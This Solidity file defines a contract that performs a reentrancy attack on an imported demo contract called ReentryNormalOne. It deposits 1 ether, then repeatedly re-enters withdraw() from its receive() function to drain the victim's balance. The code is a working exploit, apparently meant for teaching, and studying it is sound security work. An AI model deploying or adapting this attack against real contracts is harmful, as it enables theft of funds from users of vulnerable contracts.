// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "./ReentryNormalOne.sol";

/**
 * 普通重入攻击
 */
contract AttackNormalOne {
    ReentryNormalOne public etherStore;
    uint256 public constant AMOUNT = 1 ether;

    constructor(address _etherStoreAddress) {
        etherStore = ReentryNormalOne(_etherStoreAddress);
    }

    /**
     * receive is called when EtherStore sends Ether to this contract.
     * 重复提现，从而实现重入攻击
     */
    receive() external payable {
        if (address(etherStore).balance >= AMOUNT) {
            etherStore.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= AMOUNT);
        etherStore.deposit{value: AMOUNT}();
        etherStore.withdraw();
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
